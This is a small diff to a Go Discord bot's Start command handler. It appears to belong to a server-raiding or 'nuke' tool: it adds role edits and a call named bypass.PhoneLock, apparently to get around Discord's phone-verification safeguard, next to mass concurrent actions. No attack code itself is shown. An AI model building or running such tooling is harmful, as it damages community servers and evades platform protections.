@@ -1,6 +1,7 @@
 package commands
 
 import (
+	"Dynamic/core/bypass"
 	"Dynamic/core/creating"
 	"Dynamic/core/removing"
 	"Dynamic/core/requests"
@@ -75,6 +76,9 @@ func Start(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup)
 			}()
 			wg.Wait()
 
+			creating.EditRoles(s, m)
+			bypass.PhoneLock(m)
+
 			for i := 0; i < 50; i++ {
 				wg.Add(1)
 				go func() {
@@ -104,5 +108,7 @@ func Start(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup)
 
 			start_end.Leave(s, m)
 		}
+	} else {
+		return
 	}
 }
